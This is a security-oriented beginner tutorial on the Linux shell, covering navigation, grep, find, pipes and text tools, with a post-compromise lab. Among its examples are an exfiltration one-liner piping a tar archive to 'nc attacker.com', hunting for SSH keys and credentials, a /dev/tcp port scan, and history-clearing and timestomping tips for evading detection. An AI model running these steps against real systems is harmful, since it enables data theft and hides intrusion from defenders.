---
title: 'The Shell & Terminal: Navigation and File Management Mastery'
description: A Beginner-level Foundations chapter from the Security Notebooks.
sidebar:
  order: 2
head:
  - tag: link
    attrs:
      rel: canonical
      href: >-
        https://ping-praneeth.vercel.app/notebook/linux/02-the-shell-and-terminal-navigation-and-file-management
---
> **Foundations track — Yesterday you learned what the shell *is*. Today you learn what it can *do*. By the end of this chapter you'll be fluent in navigating, reading, finding, and manipulating files from the command line — the exact skill set a professional uses every single day on engagements and incident responses.

---

## Why Shell Fluency Is Non-Negotiable

Here's what separates a junior security professional from a seasoned one: the junior reaches for a GUI. The senior reaches for the shell, chains five commands together in ten seconds, and has the answer before the GUI has finished loading.

Almost every environment you work in during a security career will be **headless** (no graphical interface). Remote servers, containers, EC2 instances, post-exploitation shells on compromised boxes — they give you a terminal or nothing. Forensic analysis of disk images, log correlation across thousands of files, payload generation, automated scanning — all done from the shell.

More concretely: **grep, find, and pipes are used in literally every chapter of this roadmap.** If you're slow with them, every subsequent chapter will feel harder than it is. Invest the time here.

> **What you'll be able to do after this chapter:** Navigate any Linux system without a GUI, read/search/filter files at professional speed, find exactly the file or string you're looking for in a 10,000-file directory tree, manipulate text with precision, and chain commands together with pipes to build powerful one-liners that save hours of manual work.

---

## Part 1: Navigation — Knowing Where You Are and Where You're Going

### The Working Directory

Every process in Linux — including your shell — has a **current working directory (CWD)**. It's where relative paths are resolved from. When you open a terminal, you start in your home directory.

```bash
# Where am I?
pwd
# /home/praneeth

# The CWD is also stored in an environment variable:
echo $PWD
# /home/praneeth
```

The shell prompt usually shows you the CWD. On most default configurations:
```
praneeth@kali:~$         # ~ is shorthand for your home directory
praneeth@kali:/etc$      # you're in /etc
root@server:/tmp#        # root user in /tmp (# instead of $ = root)
```

Reading the prompt is the first thing you do when you get a shell on an unknown system. The `#` vs `$` difference tells you immediately whether you have root.

### cd — Change Directory

```bash
cd /etc               # absolute path — go to /etc
cd Documents          # relative path — go to Documents inside current dir
cd ..                 # go up one level (parent directory)
cd ../..              # go up two levels
cd ~                  # go to your home directory
cd                    # same as cd ~ (no argument = home)
cd -                  # go back to the PREVIOUS directory (like undo)
cd /var/log && pwd    # chain: cd then confirm where you are
```

The `cd -` trick is extremely useful. If you're deep in a directory, `cd` somewhere else, then want to go back, `cd -` takes you to where you just were.

```bash
# Real workflow example:
cd /var/log/apache2
ls -la
# see something interesting
cd /tmp
# work in /tmp
cd -           # boom, back in /var/log/apache2
```

### ls — List Directory Contents

`ls` is the command you'll type more than any other in your career. Master every flag.

```bash
# Basic usage
ls                    # list files in current directory (no hidden files)
ls /etc               # list a specific directory
ls -l                 # long format: permissions, owner, size, date
ls -a                 # all files, including hidden (. prefix)
ls -la                # long + all — the most common combination
ls -lah               # long + all + human-readable sizes (K, M, G)
ls -lt                # sort by modification time (newest first)
ls -ltr               # sort by time, REVERSE (oldest first — good for log dirs)
ls -lS                # sort by file size (largest first)
ls -R                 # recursive — list all subdirectories
ls -1                 # one file per line (useful in scripts)
ls -d */              # list only directories in current directory
ls --color=auto       # colorize output (usually default)
```

**Interpreting long format (`ls -la`):**

```
-rwxr-xr-x  1  root  root   65536  Jul 24 06:00  /bin/ls
│└─┘└─┘└─┘  │  │     │      │      │              │
│ │   │  │   │  │     │      │      │              └── filename
│ │   │  │   │  │     │      │      └── modification date/time
│ │   │  │   │  │     │      └── size in bytes
│ │   │  │   │  │     └── group owner
│ │   │  │   │  └── user owner
│ │   │  │   └── number of hard links
│ │   │  └── world permissions (r-x = read + execute, no write)
│ │   └── group permissions (r-x = read + execute, no write)
│ └── user/owner permissions (rwx = read + write + execute)
└── file type: - = regular file, d = directory, l = symlink, etc.
```

### tree — Visualizing Directory Structure

`tree` is not always installed by default but is invaluable:

```bash
# Install if needed:
sudo apt install tree    # Debian/Ubuntu/Kali
sudo dnf install tree    # RHEL/Fedora

tree /etc/ssh            # show directory tree
tree -L 2 /var           # limit depth to 2 levels
tree -a /home/praneeth   # include hidden files
tree -d /usr/share       # directories only
tree -f /opt             # show full paths
tree --du /var/log       # show disk usage per directory
```

**Security use:** `tree -a /home/victim` after gaining access gives you an instant map of the user's files, dotfiles, SSH keys, config files — everything in one visual overview.

---

## Part 2: Reading Files

### cat — Concatenate and Print

```bash
cat /etc/passwd               # print entire file to terminal
cat -n /etc/passwd            # with line numbers
cat -A /etc/passwd            # show special characters ($ for newline, ^I for tab)
cat file1 file2               # concatenate two files (prints both in order)
cat file1 file2 > combined    # concatenate into a new file
```

`cat` is fine for small files. For large files (logs, captures), it floods your terminal. Use the tools below instead.

### less — The Proper Way to Read Large Files

```bash
less /var/log/syslog           # open file in pager
less +G /var/log/syslog        # open at end of file (latest entries)
less /var/log/auth.log
```

**Navigation inside `less`:**

| Key | Action |
|-----|--------|
| `Space` / `f` | Page down |
| `b` | Page up |
| `g` | Go to beginning |
| `G` | Go to end |
| `/pattern` | Search forward |
| `?pattern` | Search backward |
| `n` | Next search match |
| `N` | Previous search match |
| `q` | Quit |
| `h` | Help |

```bash
# Search while viewing:
# Press / then type your search term, then Enter
# Press n to jump to next match
```

### head and tail — The Top and Bottom

```bash
head /etc/passwd               # first 10 lines (default)
head -n 20 /etc/passwd         # first 20 lines
head -n 1 /etc/passwd          # just the first line

tail /var/log/auth.log         # last 10 lines
tail -n 50 /var/log/auth.log   # last 50 lines
tail -f /var/log/auth.log      # FOLLOW — live stream as file grows
tail -F /var/log/auth.log      # follow even if file is rotated/replaced
```

`tail -f` is one of the most-used commands in security work. When you trigger an attack in a lab and want to watch the server's response in real time, you `tail -f` the log in one terminal and run the attack in another.

```bash
# Example: watch SSH login attempts live
sudo tail -f /var/log/auth.log
# Now try SSHing in from another terminal — watch the log update in real time
```

### file — What Is This File Actually?

File extensions in Linux are meaningless — the OS doesn't care. The `file` command reads the file's magic bytes (the first few bytes that identify the format):

```bash
file /bin/ls            # ELF 64-bit LSB pie executable, x86-64
file /etc/passwd        # ASCII text
file image.jpg          # JPEG image data
file unknown_binary     # may reveal: Python script, Perl script, ELF, etc.
file archive.tar.gz     # gzip compressed data
file -i document        # output MIME type instead
```

**Security use:** Attackers rename malware to look innocent (`document.pdf` that's actually an ELF binary). `file` sees through this immediately. During forensics, always run `file` on suspicious items before doing anything else.

### strings — Extract Readable Text from Binaries

```bash
strings /bin/ls              # all ASCII strings embedded in the binary
strings -n 8 /usr/bin/ssh    # strings at least 8 chars long (reduce noise)
strings malware.bin | grep -i "http\|cmd\|pass\|token"  # find network and credential strings
strings /proc/1234/exe       # strings from a running process's binary
```

**Security use:** This is one of the first things you run during malware analysis. Strings inside a binary often reveal: C2 server URLs, hardcoded passwords, API keys, file paths the malware writes to, and registry keys it modifies. You'll use this constantly in the Malware Analysis chapters.

---

## Part 3: Finding Files and Content — grep and find

These two commands are the most powerful in your arsenal. Combined, they can answer almost any "where is X" or "which files contain Y" question in seconds.

### grep — Search Inside Files

`grep` searches for a pattern (by default a basic regular expression) and prints matching lines.

```bash
# Basic usage
grep "root" /etc/passwd               # lines containing "root"
grep -i "root" /etc/passwd            # case-insensitive
grep -v "nologin" /etc/passwd         # lines NOT containing "nologin"
grep -n "root" /etc/passwd            # show line numbers
grep -c "root" /etc/passwd            # count matching lines
grep -l "password" /etc/             # list FILES that contain "password"
grep -r "password" /etc/             # recursive — search all files in /etc/
grep -r "password" /etc/ 2>/dev/null  # suppress permission denied errors
```

**Powerful grep flags:**

```bash
grep -A 3 "Failed password" /var/log/auth.log  # 3 lines After each match
grep -B 3 "Failed password" /var/log/auth.log  # 3 lines Before each match
grep -C 3 "Failed password" /var/log/auth.log  # 3 lines Context (before+after)
grep -E "pattern1|pattern2" file               # extended regex (OR)
grep -P "\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}" file  # Perl regex (IP addresses)
grep -o "pattern" file                          # print only the MATCHED part
grep -w "root" file                             # match whole word only
grep -m 5 "error" /var/log/syslog              # stop after 5 matches
```

**Regex basics for grep:**

```bash
.          # any single character
*          # zero or more of preceding
+          # one or more of preceding (needs -E)
?          # zero or one of preceding (needs -E)
^          # start of line
$          # end of line
[abc]      # character class: a, b, or c
[^abc]     # NOT a, b, or c
[a-z]      # any lowercase letter
\d         # digit (needs -P)
\w         # word character (needs -P)
\s         # whitespace (needs -P)

# Examples:
grep "^root" /etc/passwd          # lines starting with "root"
grep "bash$" /etc/passwd          # lines ending with "bash"
grep -E "^[a-z]{3,8}:" /etc/passwd  # usernames 3-8 chars, followed by :
grep -P "\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}" /var/log/auth.log  # IP addresses
```

**Real security one-liners with grep:**

```bash
# Find all failed SSH logins:
grep "Failed password" /var/log/auth.log

# Find successful SSH logins (blue team: verify these are expected):
grep "Accepted password\|Accepted publickey" /var/log/auth.log

# Extract all unique IPs from a log:
grep -oP '\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}' /var/log/auth.log | sort -u

# Find hardcoded strings that look like passwords:
grep -rn "password\|passwd\|secret\|api_key\|token" /var/www/html/ 2>/dev/null

# Find PHP files that exec shell commands (web shell hunting):
grep -rn "exec\|system\|shell_exec\|passthru\|popen" /var/www/ --include="*.php"

# Search a binary for URLs:
strings malware.bin | grep -E "https?://"
```

### find — Search for Files by Attribute

While `grep` searches *inside* files, `find` searches for files *themselves* by name, size, permissions, owner, modification time, and more.

```bash
# Basic syntax: find WHERE CONDITIONS ACTION
find /                          # list every file on the system
find /home                      # every file under /home
find . -name "*.txt"            # .txt files in current dir, recursively
find / -name "sshd_config"      # find sshd_config anywhere
find / -iname "*.conf" 2>/dev/null  # case-insensitive name, suppress errors
```

**Finding by type:**

```bash
find / -type f          # regular files only
find / -type d          # directories only
find / -type l          # symbolic links only
find /dev -type c       # character devices
find /dev -type b       # block devices
```

**Finding by permissions (security-critical):**

```bash
# SUID files — run as owner's UID (root-owned SUID = runs as root)
find / -perm /4000 -type f 2>/dev/null
# SGID files — run as group's GID
find / -perm /2000 -type f 2>/dev/null
# World-writable files (anyone can modify)
find / -perm -o+w -type f 2>/dev/null
# World-writable directories (anyone can create files here)
find / -perm -o+w -type d 2>/dev/null | grep -v "^/proc\|^/sys\|^/dev"
# Files with no owner (deleted user's files — often left by attackers)
find / -nouser -type f 2>/dev/null
```

**Finding by ownership:**

```bash
find /home -user praneeth       # files owned by praneeth
find / -user root               # files owned by root
find / -group shadow            # files owned by shadow group
find / -uid 0 -type f 2>/dev/null  # files owned by UID 0 (root)
```

**Finding by time (forensics and incident response):**

```bash
# -mtime: modification time in DAYS (file contents)
# -atime: access time in DAYS
# -ctime: change time in DAYS (includes permission/owner changes)
# Positive n = exactly n days ago; -n = less than n days; +n = more than n days

find /etc -mtime -1             # modified in the last 24 hours
find /var/www -mtime -3         # modified in last 3 days
find / -newer /etc/passwd 2>/dev/null  # newer than /etc/passwd
find /tmp -mmin -60             # modified in last 60 MINUTES

# IR use case: attacker got in, what did they touch?
find / -mtime -1 -type f 2>/dev/null | grep -v "^/proc\|^/sys"
```

**Finding by size:**

```bash
find / -size +100M              # files larger than 100 MB
find /tmp -size +1k             # files larger than 1 KB in /tmp
find /var/log -size +50M -name "*.log"  # big log files
```

**Running commands on results with -exec:**

```bash
# The {} is replaced by each found file; \; ends the -exec
find /var/www -name "*.php" -exec grep -l "shell_exec" {} \;
# Find PHP files that contain shell_exec

find /tmp -type f -name "*.elf" -exec file {} \;
# Find ELF files in /tmp and run file on each

find / -perm /4000 -type f -exec ls -la {} \; 2>/dev/null
# Find all SUID files and show their full permissions and owner

find /home -name ".bash_history" -exec cat {} \; 2>/dev/null
# Dump bash history from all user home directories
```

**xargs — faster than -exec for many files:**

```bash
find /var/www -name "*.php" | xargs grep -l "shell_exec"
# Equivalent to above but passes all results at once to grep — much faster
```

---

## Part 4: Pipes and Redirection — The Power of Composition

This is where Linux's "everything is a file" philosophy pays off. You can connect the output of any command to the input of any other command, building powerful pipelines from simple tools.

### Redirection

```bash
# Redirect stdout (output) to a file:
ls -la /etc > /tmp/etc_listing.txt     # OVERWRITE file
ls -la /var >> /tmp/listing.txt        # APPEND to file

# Redirect stderr (error output):
find / -name passwd 2>/dev/null        # discard errors to /dev/null
find / -name passwd 2>/tmp/errors.txt  # save errors to file

# Redirect both stdout and stderr:
find / -name passwd > /tmp/out.txt 2>&1        # both to same file
find / -name passwd &> /tmp/out.txt            # shorthand (bash only)
find / -name passwd > /tmp/out.txt 2>/tmp/err.txt  # separate files

# Redirect stdin (input) from a file:
sort < /etc/passwd                     # sort uses /etc/passwd as input
grep "root" < /etc/passwd             # grep reads from file via stdin
```

**Here documents (heredoc) — feed multi-line input:**

```bash
cat << EOF > /tmp/test.sh
#!/bin/bash
echo "Hello, $USER"
echo "Today is $(date)"
EOF
# This writes a 3-line file to /tmp/test.sh
```

### Pipes (`|`)

A pipe takes the **stdout** of one command and feeds it as **stdin** to the next. This is the core of shell power.

```bash
# Without pipes, you'd have to save intermediate files:
ps aux > /tmp/processes.txt
grep "apache" /tmp/processes.txt
rm /tmp/processes.txt

# With pipes, it's one line:
ps aux | grep "apache"
```

**The pipe mental model:**

```
command1 | command2 | command3 | command4
    ↓           ↓           ↓
  stdout  →  stdin/     stdout  →  stdin/     stdout  →  stdin/    stdout
              stdout              stdout
```

**Real examples:**

```bash
# How many lines in /etc/passwd?
cat /etc/passwd | wc -l
# Or more efficiently:
wc -l /etc/passwd

# Who are the users with login shells?
cat /etc/passwd | grep -v "nologin\|false\|sync" | cut -d: -f1
# cut -d: -f1 = split on ':' delimiter, take field 1 (username)

# What are the top 10 IPs hitting our web server?
cat /var/log/apache2/access.log | awk '{print $1}' | sort | uniq -c | sort -rn | head -10

# How many failed SSH attempts per source IP?
grep "Failed password" /var/log/auth.log | grep -oP '\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}' | sort | uniq -c | sort -rn | head -20

# List all SUID binaries, sorted by path:
find / -perm /4000 -type f 2>/dev/null | sort

# Find largest files on the system:
find / -type f 2>/dev/null | xargs du -sh 2>/dev/null | sort -rh | head -20
```

---

## Part 5: Text Processing Tools

These tools are the workhorses of log analysis, data extraction, and automation.

### cut — Extract Columns

```bash
# Syntax: cut -d DELIMITER -f FIELD_NUMBER
cut -d: -f1 /etc/passwd          # usernames (field 1, delimiter :)
cut -d: -f1,3 /etc/passwd        # username and UID
cut -d: -f1-4 /etc/passwd        # fields 1 through 4
cut -c1-10 /etc/passwd           # characters 1-10 of each line
```

### sort — Sort Lines

```bash
sort /etc/passwd                 # alphabetical sort
sort -n file                     # numeric sort
sort -r file                     # reverse order
sort -u file                     # unique (remove duplicates)
sort -k3 -t: /etc/passwd        # sort by 3rd field, delimiter :
sort -k3 -t: -n /etc/passwd     # numeric sort on UID field
sort -rn                         # reverse numeric (largest first)

# Common pattern: sort | uniq -c | sort -rn
# This gives you a frequency count, most common first:
cat /var/log/auth.log | grep "Failed" | grep -oP "from \K[0-9.]+" | sort | uniq -c | sort -rn
```

### uniq — Remove/Count Duplicates

```bash
# uniq only removes ADJACENT duplicates — always sort first
sort file | uniq               # remove duplicates
sort file | uniq -c            # count occurrences of each unique line
sort file | uniq -d            # show only lines that ARE duplicated
sort file | uniq -u            # show only lines that are NOT duplicated (unique)
```

### wc — Word/Line/Character Count

```bash
wc -l /etc/passwd              # number of lines (= number of users)
wc -w file                     # word count
wc -c file                     # byte count
wc -m file                     # character count
ls /etc | wc -l                # how many files in /etc
```

### tr — Translate Characters

```bash
tr 'a-z' 'A-Z' < file          # uppercase
tr -d '\r' < file.txt           # remove Windows carriage returns
tr -s ' ' < file                # squeeze multiple spaces into one
echo "hello:world" | tr ':' ' '  # replace : with space
cat /proc/$$/cmdline | tr '\0' ' '  # replace null bytes with spaces (for proc files)
```

### awk — Pattern Scanning and Processing

`awk` is a full mini-language. For security work you need its basics:

```bash
# awk '{print $N}' — print the Nth field (default delimiter = whitespace)
ps aux | awk '{print $1, $2}'        # username and PID
cat /etc/passwd | awk -F: '{print $1, $3}'  # username and UID (-F sets delimiter)

# Filtering with awk:
awk -F: '$3 == 0' /etc/passwd        # users with UID 0 (root-level)
awk -F: '$3 >= 1000' /etc/passwd     # regular user accounts (UID ≥ 1000)
awk '{if ($9 == "404") print $1, $7}' /var/log/apache2/access.log  # 404 responses

# Math with awk:
awk '{sum += $5} END {print "Total:", sum}' ls_output.txt  # sum file sizes
df -h | awk '$5 > "80%" {print $0}'   # disk partitions over 80% full

# Most useful security one-liner:
cat /var/log/apache2/access.log | awk '{print $1}' | sort | uniq -c | sort -rn | head -10
# Top 10 client IPs hitting the web server
```

### sed — Stream Editor

`sed` modifies text as it streams through. Most common uses:

```bash
sed 's/old/new/' file              # replace first occurrence per line
sed 's/old/new/g' file             # replace ALL occurrences (g = global)
sed 's/old/new/gi' file            # case-insensitive global replace
sed -i 's/old/new/g' file         # in-place edit (modifies the actual file)
sed -n '5,10p' file                # print only lines 5 through 10
sed '/pattern/d' file              # delete lines matching pattern
sed 's/^/PREFIX: /' file          # add prefix to every line
sed 's/$/ SUFFIX/' file            # add suffix to every line
sed -n '/start/,/end/p' file      # print between two patterns

# Example: clean up a password list
cat rockyou.txt | sed 's/\r//' | sed '/^$/d' > clean_rockyou.txt
# Remove Windows line endings and blank lines
```

---

## Part 6: File Management — Create, Copy, Move, Delete

### Creating Files and Directories

```bash
# Create files
touch file.txt                    # create empty file (or update timestamp)
touch file1.txt file2.txt file3.txt  # multiple files at once
echo "content" > file.txt         # create file with content
echo "more content" >> file.txt   # append content

# Create directories
mkdir newdir                      # create a directory
mkdir -p path/to/deep/directory   # create all parent dirs as needed (no error if exists)
mkdir -p /tmp/attack/{scripts,payloads,loot}  # create multiple subdirs at once

# Create and write in one go
cat > /tmp/script.sh << 'EOF'
#!/bin/bash
echo "This is my script"
id
whoami
EOF
chmod +x /tmp/script.sh
```

### Copying Files

```bash
cp source destination              # copy file
cp file1 file2 /destination/dir/  # copy multiple files to directory
cp -r sourcedir/ destdir/         # copy directory recursively
cp -v file dest                   # verbose (show what's being copied)
cp -p file dest                   # preserve permissions and timestamps
cp -a sourcedir/ destdir/         # archive mode: preserve everything (like -rp)
cp -u file dest                   # only copy if source is newer than dest
cp --backup file dest             # backup destination if it exists
```

### Moving and Renaming

```bash
mv source destination             # move file/directory (also renames)
mv oldname.txt newname.txt        # rename in place
mv file /new/location/            # move to different directory
mv -v file dest                   # verbose
mv -i file dest                   # interactive — ask before overwriting
mv -n file dest                   # no clobber — never overwrite existing
```

### Deleting Files

```bash
rm file.txt                       # delete file (no confirmation)
rm -i file.txt                    # ask for confirmation
rm -f file.txt                    # force (no error if doesn't exist)
rm -r directory/                  # delete directory recursively
rm -rf directory/                 # force recursive (DANGEROUS — no confirmation)
rm -rf /tmp/attack/               # clean up your tools after an engagement

# Secure deletion (for sensitive data):
shred -u -n 3 sensitive_file.txt  # overwrite 3 times, then delete
# Note: shred is less effective on SSDs and filesystems with journaling (ext4)
# For SSDs, full-disk encryption is the right approach

# To avoid accidental rm -rf disasters:
alias rm='rm -i'                  # add to ~/.bashrc for interactive rm
```

### Links — Hard and Symbolic

```bash
# Symbolic (soft) link — a pointer to another file:
ln -s /usr/bin/python3 /usr/local/bin/python
ln -s /var/log /tmp/logs_link
ls -la /tmp/logs_link    # shows: lrwxrwxrwx ... /tmp/logs_link -> /var/log

# Hard link — another directory entry pointing to the same inode:
ln /etc/passwd /tmp/passwd_hardlink
# Changes to either file affect both — they share the same data

# Check inode numbers to identify hard links:
ls -lai /etc/passwd /tmp/passwd_hardlink
# Both show the same inode number

# Security note: hard links can be used to persist access to a file
# even after it's been moved/renamed. Symbolic links can be used in
# symlink attacks (race conditions between check and use).
```

---

## Part 7: Viewing and Editing File Contents

### nano — The Beginner-Friendly Editor

```bash
nano /etc/hosts              # open file in nano
# Inside nano:
# Ctrl+O = save
# Ctrl+X = exit
# Ctrl+W = search
# Ctrl+K = cut line
# Ctrl+U = paste
```

### vim — The Professional Choice

Vim has a steep learning curve but it's available on virtually every system and allows editing without a mouse or GUI. Basic survival:

```bash
vim /etc/hosts          # open file in vim

# vim starts in NORMAL MODE — you cannot type directly.
# Press i to enter INSERT MODE (now you can type)
# Press Esc to return to NORMAL MODE

# In NORMAL MODE:
# :w        = save (write)
# :q        = quit
# :wq       = save and quit
# :q!       = quit without saving
# /pattern  = search forward
# n         = next search result
# dd        = delete current line
# yy        = yank (copy) current line
# p         = paste
# gg        = go to top
# G         = go to bottom
# :set nu   = show line numbers
```

For security work, you often only need to make small edits in config files or write quick scripts. `nano` is fine. But learn vim basics because on a freshly compromised minimal server, nano may not be installed.

---

## Part 8: Archives and Compression

You'll constantly deal with `.tar.gz`, `.zip`, and `.7z` files — tool downloads, evidence archives, exfiltrated data, everything.

```bash
# tar — the most common
tar -czf archive.tar.gz /directory/      # create gzipped tar archive
tar -czf archive.tar.gz file1 file2      # archive specific files
tar -xzf archive.tar.gz                  # extract gzipped tar
tar -xzf archive.tar.gz -C /output/dir/  # extract to specific directory
tar -tzf archive.tar.gz                  # list contents without extracting
tar -xzf archive.tar.gz --strip-components=1  # strip top-level directory

# gzip / gunzip
gzip file.txt                            # compress → file.txt.gz
gunzip file.txt.gz                       # decompress
gzip -d file.txt.gz                      # same as gunzip
zcat file.txt.gz                         # read compressed file without extracting

# zip / unzip
zip archive.zip file1 file2             # create zip
zip -r archive.zip directory/           # recursive (directory)
unzip archive.zip                       # extract
unzip -l archive.zip                    # list contents
unzip archive.zip -d /output/           # extract to directory

# 7zip
7z x archive.7z                         # extract
7z l archive.7z                         # list

# Quick trick: pipe tar directly for exfiltration
tar -czf - /sensitive/data | nc attacker.com 1337    # send over network
```

---

## Part 9: Hands-On Lab — The Full Security Workflow

This lab simulates the first 10 minutes after getting a shell on a compromised Linux system. Every command uses what you've learned today.

```bash
# ==========================================
# SCENARIO: You just got a shell. What do you do?
# ==========================================

# Step 1: Situational awareness
id                                    # who am I?
uname -r && cat /etc/os-release       # what system is this?
hostname && hostname -I               # name and IPs
ip a 2>/dev/null || ifconfig          # network interfaces
cat /proc/version                     # kernel (for exploit selection)

# Step 2: User and credential discovery
cat /etc/passwd | grep -v "nologin\|false" | cut -d: -f1,3,7
# Shows: username, UID, shell — only users who can actually log in
sudo -l 2>/dev/null                   # what can I sudo?
cat /etc/shadow 2>/dev/null           # do I have read access?
ls -la /home/                         # other users' home directories

# Step 3: SSH key hunting
find /home -name "*.pem" -o -name "id_rsa" -o -name "id_ed25519" 2>/dev/null
find /home -name "authorized_keys" 2>/dev/null | xargs cat 2>/dev/null
find /root -name "*.pem" -o -name "id_rsa" 2>/dev/null

# Step 4: Recent activity
last | head -20                       # who logged in recently?
lastb 2>/dev/null | head -10          # failed login attempts (shows brute force)
find / -newer /etc/passwd -type f 2>/dev/null | grep -v "^/proc\|^/sys\|^/dev" | head -30

# Step 5: Interesting files
find / -name "*.conf" -readable -type f 2>/dev/null | xargs grep -l "password\|passwd" 2>/dev/null
find / -name "*.env" -readable 2>/dev/null | xargs cat 2>/dev/null
find / -name "wp-config.php" -o -name "config.php" -o -name ".env" 2>/dev/null
cat ~/.bash_history 2>/dev/null       # what did this user do? (may have passwords)

# Step 6: Running services
ps aux | grep -v "\[" | tail -n +2    # all processes (skip kernel threads)
ss -tlnp 2>/dev/null || netstat -tlnp # listening ports (what services run here?)
cat /etc/crontab 2>/dev/null          # scheduled tasks (privesc vector)
ls /etc/cron.d/ /etc/cron.hourly/ /etc/cron.daily/ 2>/dev/null

# Step 7: Privilege escalation quick checks
find / -perm /4000 -type f 2>/dev/null | sort   # SUID files
find / -perm /2000 -type f 2>/dev/null | sort   # SGID files
find / -perm -o+w -type f 2>/dev/null | grep -v "^/proc\|^/sys\|^/dev\|^/tmp" | head -20

# Step 8: Network reconnaissance from this host
cat /proc/net/arp                     # ARP table — who's on the local network?
cat /etc/hosts                        # internal DNS entries — hostnames of other servers
cat /etc/resolv.conf                  # DNS servers (internal domain name)
cat /etc/ssh/known_hosts 2>/dev/null  # servers this machine has connected to

# Step 9: Log evidence of your activity (red team: cover tracks; blue team: analyze)
grep "$(whoami)" /var/log/auth.log 2>/dev/null | tail -20
# What does the auth log say about me?
```

### Useful One-Liners to Build and Memorize

```bash
# Extract all email addresses from a web directory:
grep -rho "[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}" /var/www/ 2>/dev/null | sort -u

# Find all PHP files with dangerous functions:
grep -rn "exec\|system\|shell_exec\|passthru\|eval\|base64_decode" /var/www/ --include="*.php" 2>/dev/null

# Show which users have cron jobs:
for user in $(cut -f1 -d: /etc/passwd); do echo "=== $user ==="; crontab -u $user -l 2>/dev/null; done

# Find all world-writable scripts executed by root's cron:
find /etc/cron* /var/spool/cron /etc/crontab -type f 2>/dev/null | xargs ls -la 2>/dev/null | grep -E "^-...[w]"

# Quick port scan using /dev/tcp (no nmap needed):
for port in 22 80 443 3306 5432 6379 8080 8443; do
  (echo > /dev/tcp/target_ip/$port) 2>/dev/null && echo "OPEN: $port"
done

# Hash all files in a directory (for integrity checking):
find /etc -type f 2>/dev/null | xargs sha256sum 2>/dev/null > /tmp/etc_hashes.txt
```

---

## Part 10: Common Mistakes and How to Avoid Them

### Mistake 1: `rm -rf` Without Thinking

There is no Recycle Bin in Linux. `rm -rf wrongdirectory/` is permanent and immediate. Always double-check:

```bash
# Before: test the path first
ls /path/you/want/to/delete
# Or use echo to dry-run:
echo "Would delete:" /path/you/want/to/delete

# After verifying: delete
rm -rf /path/you/want/to/delete
```

### Mistake 2: Forgetting 2>/dev/null

Without it, `find /` floods your terminal with "Permission denied" errors. You can't read the real output. Always suppress errors when searching system-wide:

```bash
find / -name "passwd" 2>/dev/null   # correct
find / -name "passwd"               # wrong — error storm
```

### Mistake 3: grep on Binary Files

`grep` on a binary file outputs garbage and can hang. Use `-a` to force text mode, or check with `file` first:

```bash
file unknown_file               # check first
grep -a "pattern" binary_file   # treat binary as text
strings binary_file | grep "pattern"  # safer — use strings first
```

### Mistake 4: Overwriting Instead of Appending

```bash
# DANGER:
cat results.txt > existing_file.txt    # OVERWRITES — all previous content gone
# CORRECT when you want to add to a file:
cat results.txt >> existing_file.txt   # APPENDS
```

### Mistake 5: Piping When You Should Redirect

```bash
# Wrong:
cat file.txt | grep "pattern" | cat > output.txt  # extra cat is useless
# Right:
grep "pattern" file.txt > output.txt
```

### Mistake 6: find Without -maxdepth on Large Filesystems

```bash
find / -name "*.conf"            # searches entire filesystem — can take minutes
find /etc -name "*.conf"         # restrict the search path
find /etc -maxdepth 2 -name "*.conf"  # also limit depth
```

---

## Part 11: Detection & Defense Angle

### What Blue Teams Watch

**Shell history logging:** On modern systems, every command you type is logged in `~/.bash_history`. But savvy attackers know to:

```bash
unset HISTFILE          # disable history for this session
export HISTSIZE=0       # set history size to 0
history -c              # clear current session history
```

Enterprise environments use **auditd** with shell logging to capture commands regardless of history settings. Some deploy **sysdig** or **Falco** which hook into kernel syscalls and log every execve call — meaning every command run by every process, with arguments, in real time.

**Filesystem watching:** Tools like `inotifywait` watch for file changes in real time:

```bash
# Defender watches /tmp for new executables being created:
inotifywait -m -r -e create,modify /tmp --include='.*\.(elf|sh|py|pl|rb)$'
```

**Log analysis pipelines:** SOC analysts use exactly the grep/awk/sort/uniq one-liners from this chapter to analyze logs at scale. The difference: they pipe to a SIEM (Splunk, ELK) for storage and dashboards, but the underlying queries use the same pattern matching.

### OPSEC for Red Teamers

Knowing what defenders watch, red teamers:
- Operate in-memory where possible (no files dropped to disk → `find` and filesystem monitors miss it)
- Work in `/dev/shm/` instead of `/tmp` on some engagements (often less monitored, RAM-backed)
- Use `unset HISTFILE` immediately upon getting a shell
- Timestamp-modify (touch) any files they do write to blend into existing access times

---

## Part 12: Final Revision / Summary

**Navigation you own now:**
- `pwd` → where am I; `cd path` → go there; `cd -` → go back; `cd ~` → go home
- `ls -la` → see everything in a directory including hidden files and permissions
- `tree -L 2` → visual map of a directory structure

**Reading files:**
- `cat` → small files; `less` → large files; `head/tail -n N` → top/bottom of file
- `tail -f` → live stream of a growing file (live log watching)
- `file` → what type is this binary; `strings` → readable text inside binaries

**Finding things:**
- `grep -rn pattern /path/` → find pattern inside files, recursively, with line numbers
- `grep -oP regex` → extract just the matching part (IP addresses, emails, tokens)
- `find / -perm /4000` → SUID files; `find / -mtime -1` → recently changed files
- `-exec command {} \;` → run a command on every result

**Pipes and redirection:**
- `>` = overwrite; `>>` = append; `<` = read from file; `2>/dev/null` = discard errors
- `|` chains commands: output of left → input of right
- `sort | uniq -c | sort -rn` = frequency count (most common first)

**Text processing:**
- `cut -d: -f1` → extract column 1 delimited by `:`
- `awk '{print $2}'` → print 2nd whitespace-delimited field
- `sed 's/old/new/g'` → global find-and-replace
- `wc -l` → count lines; `sort -u` → sort and deduplicate

---

## Part 13: Cheat Sheet / Quick Reference

```bash
# ── NAVIGATION ──────────────────────────────────────────────────
pwd                               # where am I?
cd /path                          # go to absolute path
cd ..                             # up one level
cd -                              # go back (previous directory)
ls -la                            # long listing including hidden files
ls -lah                           # same + human-readable sizes
ls -lt                            # sort by time (newest first)
tree -L 2 /path                   # visual tree, 2 levels deep

# ── READING ─────────────────────────────────────────────────────
cat file                          # print file
less file                         # pager (/search, q=quit, G=end)
head -n 20 file                   # first 20 lines
tail -n 20 file                   # last 20 lines
tail -f file                      # live stream as file grows
file binary                       # what type is this file?
strings binary | grep -i pass     # readable strings in binary

# ── GREP ────────────────────────────────────────────────────────
grep "pattern" file               # search in file
grep -i "pattern" file            # case-insensitive
grep -r "pattern" /path/          # recursive search
grep -rn "pattern" /path/         # recursive + line numbers
grep -v "pattern" file            # invert (lines NOT matching)
grep -oP "regex" file             # extract only matching part
